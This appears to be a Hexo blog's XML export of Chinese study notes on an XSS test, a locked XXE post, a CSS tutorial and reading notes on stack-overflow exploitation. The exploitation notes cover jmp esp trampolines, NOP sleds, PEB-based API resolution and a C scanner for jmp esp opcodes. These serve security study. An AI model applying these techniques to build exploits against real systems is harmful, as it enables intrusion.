<p>通过上面两个步骤的测试，可发现具体的输入点及输出位置，那么存在 XSS 漏洞的基本条件就已经具备了。但 XSS 攻击在这个测试点是否能顺利进行，就需要通过一些基本的跨站代码来测试，如果其中环节被过滤，则攻击依然无效。测试 XSS 攻击的经典方式就是<mark class="label primary">弹窗测试</mark>，即在输入中插入一段可以产生弹窗效果的<code>JavaScript</code>脚本，如果<strong>刷新页面产生了弹窗，表明 XSS攻击测试成功</strong>。</p>
<h3 id="2-3-XSS进阶测试方法"><a href="#2-3-XSS进阶测试方法" class="headerlink" title="2.3 XSS进阶测试方法"></a>2.3 XSS进阶测试方法</h3><p><img data-src="https://i.loli.net/2021/01/07/kZSaULiMHnV6QPX.png" alt="屏幕快照 2021-01-07 下午2.00.46.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE-XML</title>
    <url>/post/xxe-xml-dtd/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="25d0faea82d052eca74e4b26b252b86551556b82b6c48e81c400a20538eb7f4f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XXE</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>0day安全：软件漏洞分析技术（第二版）读书笔记（3-4）</title>
    <url>/post/0day2-3-4/</url>
    <content><![CDATA[<p>漏洞利用技术才是实施有效攻击的最核心技术，才是突破安全边界、实施深度入侵的关键所在。ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="第三章-开发shellcode的艺术"><a href="#第三章-开发shellcode的艺术" class="headerlink" title="第三章 开发shellcode的艺术"></a>第三章 开发shellcode的艺术</h2><h3 id="3-1-shellcode概述"><a href="#3-1-shellcode概述" class="headerlink" title="3.1 shellcode概述"></a>3.1 shellcode概述</h3><h4 id="3-1-1-shellcode-exploit-poc"><a href="#3-1-1-shellcode-exploit-poc" class="headerlink" title="3.1.1 shellcode | exploit | poc"></a>3.1.1 shellcode | exploit | poc</h4><div class="note warning"><p><mark class="label warning">shellcode</mark><mark class="label success">exploit</mark><mark class="label primary">poc</mark></p>
<p><mark class="label warning">shellcode</mark>：通称缓冲区溢出攻击中<mark class="label default">植入进程的代码</mark>。shellcode往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常还会受到很多苛刻限制，故开发和调试的难度很高。</p>
<p><mark class="label success">exploit</mark>：植入代码之前需要做大量的调试工作，例如</p>
<ol>
<li>弄清楚程序有几个输入点；</li>
<li>这些输入将最终会当作哪个函数的第几个参数读入到内存的哪个区域；</li>
<li>哪一个输入会造成栈溢出；</li>
<li>在复制到栈区的时候对这些数据有没有额外的限制等。</li>
</ol>
<p>调试之后还要计算函数返回地址距离缓冲区的偏移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着shellcode的输入字符串。这个<strong>代码植入的过程就是漏洞利用</strong>，也就是<strong>exploit，简称EXP</strong>。</p>
<p><mark class="label danger">Exploit负责将程序导向shellcode，shellcode又称为payload。</mark></p>
<p><mark class="label primary">poc</mark>：PoC(Proof of Conecpt)，概念性证明，是证明漏洞存在而提供的一段代码或方法，只要能够触发漏洞即可。用其对漏洞进行验证。</p>
</div>

<p>shellcode 这段代码可以是出于恶作剧目的的弹出一个消息框，也可以是出于攻击目的的删改重要文件、窃取数据、上传木马病毒并运行，甚至是出于破坏目的的格式化硬盘等。请注意本章讨论的shellcode是这种广义上的植入进程的代码，而不是狭义上的仅仅用来获得shell的代码。</p>
<div class="note primary"><p>exploit一般以一段代码的形式出现， 用于生成攻击性的网络数据包或者其他形式的攻击性输入。expliot的核心是淹没返回地址劫持进程的控制权，之后跳转去执行shellode，与<mark class="label info">shellcode具有一定的通用性</mark>不同，exploit往往是针对特定漏洞而言的。<mark class="label warning">exploit关心的是怎样淹没返回地址，获得进程控制权，把EIP传递给shellcode让其得到执行并发挥作用，而不关心shellcode到底是何用途。</mark></p>
</div>

<h4 id="3-1-2-shellcode需要解决的问题"><a href="#3-1-2-shellcode需要解决的问题" class="headerlink" title="3.1.2 shellcode需要解决的问题"></a>3.1.2 shellcode需要解决的问题</h4><p>在上节的代码植入实验中，我们直接用 OllyDbg 查出了栈中shellode的起始地址。而在实际调试漏洞时，尤其是在调试 IE 中的漏洞时，我们经常会发现有缺陷的<strong>函数位于某个动态链接库中</strong>，且在程序运行过程中被动态装载。这时的栈中情况将会是动态变化着的，也就是说，这次从调试器中直接抄出来的shellcode起始地址下次就变了。<strong>要编写出比较通用的shellcode就必须找到一种途径</strong><mark class="label success">让程序能够自动定位到shellode的起始地址</mark>。</p>
<div class="note success"><p><strong>要编写出比较通用的shellcode就必须找到一种途径</strong><mark class="label success">让程序能够自动定位到shellode的起始地址</mark>。</p>
<p>不同的机器、操作系统中同一个API函数的入口地址往往会有差异，必须让shellcode自己运行时<strong>动态地获得当前系统的API地址</strong>。</p>
</div>

<h3 id="3-2-定位shellcode"><a href="#3-2-定位shellcode" class="headerlink" title="3.2 定位shellcode"></a>3.2 定位shellcode</h3><h4 id="3-2-1-栈帧移位与jmp-esp"><a href="#3-2-1-栈帧移位与jmp-esp" class="headerlink" title="3.2.1 栈帧移位与jmp esp"></a>3.2.1 栈帧移位与jmp esp</h4><h5 id="栈帧移位"><a href="#栈帧移位" class="headerlink" title="栈帧移位"></a>栈帧移位</h5><p>第二章修改返回地址的代码植入实验，用越界的字符完全控制返回地址后，需要将返回地址改写成 shellode 在内存中的起始地址。在实际的漏洞利用过程中，由于动态链接库的装入和卸载等原因，Windows 进程的函数栈帧很有可能会产生“移位”，即 shellcode 在内存中的地址是会动态变化的，因此如果单纯地将返回地址简单地覆盖成一个定值的做法往往不能让 exploit 奏效，如图3.2.1所示。所以必须想出一种方法能够<mark class="label primary">在程序运行时动态定位栈中的shellcode的起始地址</mark>。</p>
<p><img data-src="https://i.loli.net/2021/02/07/7S1GX2o9WcsNqfr.png" alt="29.png"></p>
<h5 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h5><p>一般情况下，ESP寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP所指的位置恰好是我们所淹没的返回地址的下一个位置（32位系统返回地址+4），即栈顶。如图3.2.3左图所示。</p>
<p>提示：函数返回时，ESP 所指位置还与函数调用约定、返回指令等有关。</p>
<div class="note danger"><p>对于<mark class="label default">jmp esp 原理</mark>理解：</p>
<ol>
<li>程序先去执行<code>jmp esp</code>这条指令，这条指令的含义是跳转到寄存器 ESP 里面的地址去，<code>jmp esp</code>指令在进程中有独立地址，可查找。</li>
<li>ESP寄存器的内容刚好是函数返回时调用者函数的栈顶，如果将 shellcode 的起始地址紧跟在<code>返回地址+4</code>的区间里面去，则指令执行完被淹没的返回地址里面<code>jmp esp</code>指令后继续执行 shellcode。</li>
</ol>
</div>

<h5 id="动态定位shellcode"><a href="#动态定位shellcode" class="headerlink" title="动态定位shellcode"></a>动态定位shellcode</h5><p>由于ESP寄存器在函数返回后不被溢出数据干扰，且始终指向返回地址之后的位置，我们可以使用图3.2.3所示的这种定位 shellcode 的方法来进行动态定位。这里的<code>jmp esp</code>被称作<mark class="label info">跳板</mark>。</p>
<div class="note default"><p><mark class="label danger">JMP ESP 原理</mark></p>
<ol>
<li><p>用内存中任意一个<code>jmp esp</code>指令<mark class="label warning">的地址</mark>覆盖函数返回地址，而不是原来用手工查出的 shellcode 起始地址直接覆盖。</p>
</li>
<li><p>函数返回后被重定向去执行内存中的这条<code>jmp esp</code>指令，而不是直接开始执行shellcode。</p>
</li>
<li><p>由于 esp 在函数返回时仍指向栈区（函数返回地址之后），<code>jmp esp</code>指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。</p>
</li>
<li><p>重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把 shellcode 恰好摆放在函数返回地址之后。这样，<code>jmp esp</code>指令执行过后会恰好跳进 shellcode。</p>
</li>
</ol>
</div>

<p><img data-src="https://i.loli.net/2021/02/07/41dZs2vxVRz9pXe.png" alt="30.png"></p>
<h4 id="3-2-2-获取“跳板”的地址"><a href="#3-2-2-获取“跳板”的地址" class="headerlink" title="3.2.2 获取“跳板”的地址"></a>3.2.2 获取“跳板”的地址</h4><p>必须首先获得进程空间内一条<code>jmp esp</code>指令的地址作为 “跳板”。程序运行时，除了 PE 文件的代码被读入内存空间，一些经常被用到的动态链接库也将会同被映射到内存。其中，诸如<code>kernel32.dll</code>、<code>user32 dll</code>之类的动态链接库会被几乎所有的进程加载，且<strong>加载基址始终相同</strong>。</p>
<p><strong>实验</strong></p>
<p>执行 shellcode 章节（2.7）实验中的有漏洞的密码验证程序已经加载了<code>user32dll</code>，所以我们准备使用<code>user32.dll</code>中的<code>jmp esp</code>作为跳板。<strong>获得<code>user32.dll</code>内跳转指令地址最直观的方法就是编程序搜索内存</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">&quot;user32.dll&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    BYTE* ptr; </span><br><span class="line">    <span class="keyword">int</span> position,address;</span><br><span class="line">    HINSTANCE handle; </span><br><span class="line">    BOOL done_flag=FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME); </span><br><span class="line">    <span class="keyword">if</span>(!handle) </span><br><span class="line">    &#123; </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;load dll error!&quot;</span>); </span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    ptr=(BYTE*)handle;</span><br><span class="line">    <span class="keyword">for</span>(position=<span class="number">0</span>;!done_flag;position++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span>(ptr[position]==<span class="number">0xFF</span>&amp;&amp;ptr[position+<span class="number">1</span>]==<span class="number">0xE4</span>)<span class="comment">//jmp esp对应的机器码为0xFFE4 </span></span><br><span class="line">            &#123; </span><br><span class="line">              <span class="keyword">int</span> address=(<span class="keyword">int</span>)ptr+position; </span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span>(...) </span><br><span class="line">        &#123; </span><br><span class="line">           <span class="keyword">int</span> address=(<span class="keyword">int</span>)ptr+position; </span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;END OF 0x%x\n&quot;</span>,address); </span><br><span class="line">           done_flag=<span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">     &#125; </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>jmp esp</code>对应的机器码是<code>0xFFE4</code>，上述程序的作用就是从<code>user32.dll</code>在内存中的基地址开始向后搜索<code>0xFFE4</code>，如果找到就返回其内存地址（指针值）。同理如果想使用别的动态链接库中的地址（如“kernel32.dI”、“mfc42.dIl” 等），或者使用其他类型的跳转地址（如call esp，jmp ebp等)，也可以通过对上述程序稍加修改而轻易获得。</p>
<h3 id="3-3-缓冲区的组织"><a href="#3-3-缓冲区的组织" class="headerlink" title="3.3 缓冲区的组织"></a>3.3 缓冲区的组织</h3><h4 id="3-3-1-缓冲区的组成"><a href="#3-3-1-缓冲区的组成" class="headerlink" title="3.3.1 缓冲区的组成"></a>3.3.1 缓冲区的组成</h4><div class="note info"><p>送入缓冲区的数据可以分为以下几种：</p>
<ol>
<li>填充物：可以是任何值，但是一般用<code>NOP</code>指令对应的<code>0x90</code>来填充缓冲区，并把 shellcode 布置于其后（<code>NOP</code>的高地址）。这样即使不能准确地跳转到 shellcode 的开始，只要能跳进填充区，处理器最终也能顺序执行到 shellcode。</li>
<li>淹没返回地址的数据：可以是跳转指令的地址、shellcode 起始地址，甚至是一个近似 shellcode 的地址（通过<code>nop</code>滑入）。</li>
<li>shellcode：可执行的机器代码。</li>
</ol>
</div>

<p>在缓冲区中如何布置 shellcode 对 exploit 的成功至关重要，当 shellcode 较缓冲区小很多时，可直接将其置于返回地址之前（地址较返回地址小），当 shellcode 较大时，将其置于返回地址之后（地址较返回地址大），然后可以使用 <code>jmp esp</code>等指令来定位 shellcode。但是需要注意的问题就是这样的 shellcode 布置于前一个栈帧中，当 shellcode 较大时，这样就会大范围地破坏前栈帧数据可能引发一些其他问题。</p>
<h4 id="3-3-2-抬高栈顶保护shellcode"><a href="#3-3-2-抬高栈顶保护shellcode" class="headerlink" title="3.3.2 抬高栈顶保护shellcode"></a>3.3.2 抬高栈顶保护shellcode</h4><p>将shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变了ESP寄存器中的值，<mark class="label warning">逻辑上，ESP以上的内存空间的数据已经作废；</mark><mark class="label success">物理上，这些数据并没有被销毁</mark>。</p>
<p>当前栈逻辑上销毁后，栈帧返回到调用函数，如果shellode被再次调用时，若shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用<code>push</code>指令在栈中暂存数据，压栈数据很可能会破坏到shellcode本身，压栈的数据会增高当前栈帧的高度，然后覆盖逻辑上已被销毁的栈帧中的shellcode。这里假设调用函数的栈帧是紧挨着被调函数的，位于被调函数的高地址，这个过程如图3.3.2所示。</p>
<p>当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向）， 这时shellcode离调用函数栈顶较远，几次压栈可能只会破坏到一些填充值<code>nop</code>；但是，如果缓冲区已经被shellcode占满，则shellcode离调用函数栈顶比较近，这时的情况就比较危险了。</p>
<p>为了使shellcode具有较强的通用性，我们通常会在shellode开始就大范围抬高被调函数栈顶，如下第三图<code>jmp esp-X</code>后定位一条指令<code>sub esp,N</code>，这里的N足够大以覆盖被调函数的栈，将逻辑上已经销毁的被调函数的栈变成当前函数的栈，把shellcode“藏”在栈内保护起来，从而达到保护自身安全的目的。这个过程如图3.3.3所示。</p>
<p>【<a href="https://brant-ruan.github.io/0day/2018/06/14/0day3.html">0day安全 | Chapter 3 开发shellcode的艺术</a>】</p>
<p><img data-src="https://i.loli.net/2021/02/19/hobeUvdJOFRAWk5.png" alt="31.png"></p>
<p><img data-src="https://i.loli.net/2021/02/19/IAgrduTezbBCEnL.png" alt="32.png"></p>
<p><img data-src="https://i.loli.net/2021/02/19/JnLQfONMEHDe46P.png" alt="34"></p>
<p><img data-src="https://i.loli.net/2021/02/19/GX9CjfvD7mUJLRO.png" alt="33.png"></p>
<p><img data-src="https://i.loli.net/2021/02/20/qCpf1FO3wdMnIJW.png" alt="35.png"></p>
<h4 id="3-3-3-使用NOP雪橇"><a href="#3-3-3-使用NOP雪橇" class="headerlink" title="3.3.3 使用NOP雪橇"></a>3.3.3 使用NOP雪橇</h4><p>个别有苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用 shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中：如果能够淹没大片的内存区域，可以将shellcode 布置在一大段<code>nop</code>之后。这时定位shellcode时，只要能跳进这一大片<code>nop</code>中，shellcode就可以最终得到执行，如图3.3.4所示。</p>
<div class="note danger"><p><code>NOP</code>指令除了对程序计数器加一，使之指向下一条指令之外，没有其他任何效果。这种将跳转定位在一片<code>nop</code>指令之中一直执行到shellcode（<code>nop</code>比shellcode更靠近栈顶），就好像是在滑行，所以也称之为“空操作雪橇”（nop sled）。浏览器的漏洞利用采用Heap Spray也是相同思想。</p>
</div>

<h4 id="3-3-4-函数返回地址移位"><a href="#3-3-4-函数返回地址移位" class="headerlink" title="3.3.4 函数返回地址移位"></a>3.3.4 函数返回地址移位</h4><ol>
<li>使用大片返回地址来覆盖真正的返回地址。</li>
<li>地址覆盖时可能会发生字节错位，可以使用堆中的地址来放置shellcode，进行绕过。</li>
</ol>
<p>如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就可以得到执行。这个过程如图3.3.5所示。</p>
<p>在覆盖返回地址时可能会发生字节错位的情况如<code>strcat</code>产生的漏洞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(程序安装目录, 输入的字符串);</span><br></pre></td></tr></table></figure>

<p>在不同主机上程序安装目录可能不同，如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">C:\xxx\</span><br><span class="line">C:\xxxy\</span><br><span class="line">C:\xxxyz\</span><br><span class="line">C:\xxxyza\</span><br></pre></td></tr></table></figure>

<p>假如把返回地址覆盖为<code>0x77DC965B</code>，则理论上只有25%的成功率。上面提到的使用一片连续的跳转指令地址的方法不起作用，因为<strong>多出的字节只要不是地址长度的倍数，就一定会引起地址的错位</strong>：</p>
<p><img data-src="https://i.loli.net/2021/02/20/fxUhpEFi6NCQPzg.png" alt="36.png"></p>
<p>解决办法是：使用堆的地址来解决，使用<code>0x0a0a0a0a</code>、<code>0x0c0c0c0c</code>之类的返回地址。当然这种情况下，shellcode位于堆上。</p>
<p><img data-src="https://i.loli.net/2021/02/20/Hi5PsxO7XDz6GEM.png" alt="37.png"></p>
<h3 id="3-4-开发通用的shellcode"><a href="#3-4-开发通用的shellcode" class="headerlink" title="3.4 开发通用的shellcode"></a>3.4 开发通用的shellcode</h3><h4 id="3-4-1-定位API的原理"><a href="#3-4-1-定位API的原理" class="headerlink" title="3.4.1 定位API的原理"></a>3.4.1 定位API的原理</h4><p>前面解决了shellcode地址不定的问题，本节解决不同操作系统版本、不同补丁环境下动态链接库中导出函数地址不定的问题。方法很简单：在shellcode中对函数先定位，再调用。</p>
<p>影响动态链接库中的导出函数的主要因素有：</p>
<ol>
<li><strong>不同的操作系统版本</strong>。</li>
<li><strong>不同的补丁版本</strong>：很多安全补丁会修改这些动态链接库中的函数，使得不同版本补丁对应的动态链接库的内容有所不同，包括动态链接库文件的大小和导出函数的偏移地址。由于这些因素，我们手工查出的API地址很可能会在其他计算机上失效。</li>
</ol>
<p>在shellcode中使用静态函数地址来调用API会使exploit的通用性受到很大限制。所以，实际中使用的shellcode必须还要能动态地获得自身所需的API函数地址。</p>
<div class="note default"><p>Windows的API是通过动态链接库中的导出函数来实现的，例如：</p>
<ul>
<li>内存操作等的数在<code>kernel32.dll</code>中实现</li>
<li>大量的图形界面相关的API则在<code>user32.dll</code>中实现。</li>
</ul>
</div>

<p>Win_32平台下的shellcode使用最广泛的方法，就就是从进程环境块（PEB）中找到动态链接库的导出表，并搜索出所需的API地址，然后调用。</p>
<mark class="label danger">所有Win_32程序都会加载 ntdll.dll 和 kernel32.dll 这两个最基础的动态链接库。</mark>

<p>如果想要在Win_32平台下定位kernel.dll中的API地址，可以采用如下方法：</p>
<ol>
<li>首先通过段选择字FS在内存中找到当前的线程环境块TEB。</li>
<li>线程环境块偏移位置为<code>0x30</code>的地方存放着指向进程环境块PEB的指针。</li>
<li>进程环境块中偏移位置为<code>0x0C</code>的地方存放着指向<code>PEB_LDR_DATA </code>结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</li>
<li><code> PEB_LDR_DATA</code>结构体偏移位置为<code>0x1C</code>的地方存放着指向模块初始化链表的头指针<code>InInitializationOrderModuleList</code>。</li>
<li>块初始化链表<code>InInitializationOrderModuleList</code>中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32.dll。</li>
<li>找到属于kernel32.dll的结点后，在其基础上再偏移<code>0x08</code>就是kenel32.dlI在内存中的加载基地址。</li>
<li>从kernel32.dll的加载基址算起，偏移<code>0x3C</code>的地方就是其PE头。</li>
<li>PE头偏移<code>0x78</code>的地方存放着指向函数导出表的指针。</li>
<li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址，如图3.4.1<ul>
<li>导出表偏移<code>0x1C</code>处的指针指向存储导出函数偏移地址(RVA)的列表。</li>
<li>导出表偏移<code>0x20</code>处的指针指向存储导出函数函数名的列表。</li>
<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA。</li>
<li>获得RVA后，再加上前边已经得到的动态链接库的加载基址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。</li>
</ul>
</li>
</ol>
<p>按照上面的方法，我们已经可以获得kernel32.dll中的任意函数。类似地，我们已经具备了定位ws2_32.dlI中的winsock函数来编写一个能够获得远程shell的真正的shellcode了。</p>
<div class="note warning"><p><code>kernel32.dll</code>中有两个导出函数：<code>LoadLibrary</code>和<code>GetProcAddress</code>，可以通过这两个函数帮助定位其他API。由于<code>MessageBox</code>位于<code>user32.dll</code>库中，后面我们将借助<code>LoadLibrary</code>为shellcode加载<code>user32.dll</code>，从而调用<code>MessageBox</code>。</p>
</div>

<p><img data-src="https://i.loli.net/2021/02/20/v9Ntf3lkWC1cAHB.png" alt="38.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 基础</title>
    <url>/post/HTML-CSS/</url>
    <content><![CDATA[<p>hhh… ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>

<br />

<br />

<center><font color="#00B2EE" face="Comic sans MS" size=5>CSS 基础</font> </center>


<br />

<br />





<h3 id="一-CSS-初识"><a href="#一-CSS-初识" class="headerlink" title="一. CSS 初识"></a><font color="#FF6347" face="Comic sans MS">一. CSS 初识</font></h3><br />


<p><font face="Microsoft YaHei"><strong>CSS是给HTML标记加的样式；JS是给HTML标记加的行为。HTML标记是最先出现的。</strong></font></p>
<blockquote>
<ol>
<li>CSS是什么?</li>
<li>为什么要使用CSS?</li>
<li>CSS和HTML是什么关系？</li>
<li>CSS应该怎样使用？</li>
</ol>
</blockquote>
<br />


<p><font color="#00B2EE"><strong>1. CSS是什么?</strong></font></p>
<ol>
<li><p>CSS（Cascading Stylesheets，层叠样式表）。</p>
</li>
<li><p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p>
</li>
<li><p>是一种制作网页的新技术，现在已经为大多数的浏览器所支持，成为网页设计必不可少的工具之一。使用CSS能够简化网页的格式代码，加快下载显示的速度，也减少了需要上传的代码数量，大大减少了重复劳动的工作量。尤其是当你面对的是有数百个网页的站点时，CSS简直象是神对我们的恩赐！</p>
</li>
</ol>
<br />

<p><font color="#00B2EE"><strong>2. 为什么要使用CSS?</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>HTML</strong>超文本标注语言</font>：各种HTML标记。<br><font color="#FF7F00"><strong>CSS</strong>层叠样式表</font>：给HTML标记加的样式。<br><font color="#FF7F00"><strong>JavaScript</strong>脚本程序</font>：给HTML标记加的程序。</p>
</blockquote>
<p>   W3C（The World Wide Web Consortium）把动态HTML（Dynamic HTML）分为三个部分来实现：脚本语言（包括javascript、Vbscript等）、支持动态效果的浏览器（包括Internet Explorer、Netscape Navigator等）和CSS样式表。</p>
<br />

<p><font color="#00B2EE"><strong>3. CSS和HTML是什么关系？</strong></font></p>
<p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p>
<br />

<p><font color="#00B2EE"><strong>4. CSS应该怎样使用？</strong></font></p>
<blockquote>
<ol>
<li>在HTML标签中直接使用。</li>
<li>在HTML标签先定义属性id或者class，然后在**<code>&lt;head&gt;&lt;/head&gt;</code>**定义一个样式表来表现这个属性id或者class。</li>
</ol>
</blockquote>
<p>CSS注释以 <strong><code>/*</code></strong> 开始, 以 <strong><code>*/</code></strong>  结束, 实例如下:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*这是个注释*/</span></span><br><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line"><span class="comment">/*这是另一个注释*/</span></span><br><span class="line"><span class="attribute">color</span>:black;</span><br><span class="line"><span class="attribute">font-family</span>:arial;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br />

<br />



<h3 id="二-CSS-框架"><a href="#二-CSS-框架" class="headerlink" title="二. CSS 框架"></a><font color="#FF6347" face="Comic sans MS">二. CSS 框架</font></h3><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明</p>
<p><img data-src="https://i.loli.net/2019/03/10/5c84f57ee276a.png" alt="1.png"></p>
<br />

<p><font color="#FF7F00"><strong>选择器：</strong></font>就是选择HTML标记，换句话说：就是给哪个HTML标记加样式。<br><font color="#FF7F00"><strong>格式声明语句：</strong></font>由**<code>&#123; &#125;</code><strong>构成，</strong><code>&#123; &#125;</code><strong>中每条声明由</strong><code>属性名:属性值;</code>**构成。</p>
<p><font color="#FF7F00"></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>每个属性有一个值，属性和值被冒号**<code>:</code><strong>分开。属性和属性之间用英文分号</strong><code>；</code><strong>隔开。最后以分号</strong><code>；</code>**结束。</li>
<li>属性值，一个属性名可以取不同的值，这个值不加引号。</li>
<li>CSS中的数字单位都是**<code>px</code><strong>，这个</strong><code>px</code>**不能省略。</li>
</ol>
<br />

<h4 id="2-1-CSS-样式"><a href="#2-1-CSS-样式" class="headerlink" title="2.1 CSS 样式"></a><font color="#3CB371" face="Comic sans MS">2.1 CSS 样式</font></h4><p>要想在浏览器中显示出预期的CSS样式表效果，就要让浏览器识别并正确调用CSS。当浏览器读取样式表时，要依照文本格式来读，这里介绍四种在页面中插入CSS样式表的方法：<strong>链入外部样式表、内部样式表、导入外部样式表和内联样式</strong>。</p>
<br />

<h5 id="1-链入外部样式表"><a href="#1-链入外部样式表" class="headerlink" title="1. 链入外部样式表"></a><font color="#00B2EE" face="Microsoft YaHei">1. 链入外部样式表</font></h5><p><strong>链入外部样式表：</strong>是把样式表（选择器+声明）保存为一个样式表**<code>.css</code><strong>文件，然后在页面中用</strong><code>&lt;link&gt;</code><strong>标记来链接到这个样式表文件，这个</strong><code>&lt;link&gt;</code><strong>标记必须放到页面的</strong><code>&lt;head&gt;...&lt;/head&gt;</code>**区内。</p>
<p>如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line"></span><br><span class="line">…… </span><br><span class="line">&lt;link href=<span class="string">&quot;mystyle.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt; </span><br><span class="line">…… </span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<blockquote>
<p>上面这个例子表示浏览器从mystyle.css文件中以文档格式读出定义的样式表。<br>**<code>href=&quot;mystyle.css&quot;</code>**是文件所在的位置。<br>**<code>rel=&quot;stylesheet&quot;</code>**是指在页面中使用这个外部的样式表。rel 属性规定当前文档与被链接文档之间的关系。<br>**<code>type=&quot;text/css&quot;</code>**是指文件的类型是样式表文本。<br>**<code>media</code>**是选择媒体类型，这些媒体包括：屏幕，纸张，语音合成设备，盲文阅读设备等。</p>
</blockquote>
<p>　　<font color="#FF7F00"><strong>一个外部样式表文件可以应用于多个页面</strong></font>。当你改变这个样式表文件时，所有页面的样式都随之而改变。在制作大量相同样式页面的网站时，非常有用，不仅减少了重复的工作量，而且有利于以后的修改、编辑，浏览时也减少了重复下载代码。</p>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font><br>样式表文件可以用任何文本编辑器（例如：记事本）打开并编辑，一般样式表文件扩展名为.css。内容是定义的样式表，不包含HTML标记，mystyle.css这个文件的内容如下：</p>
</blockquote>
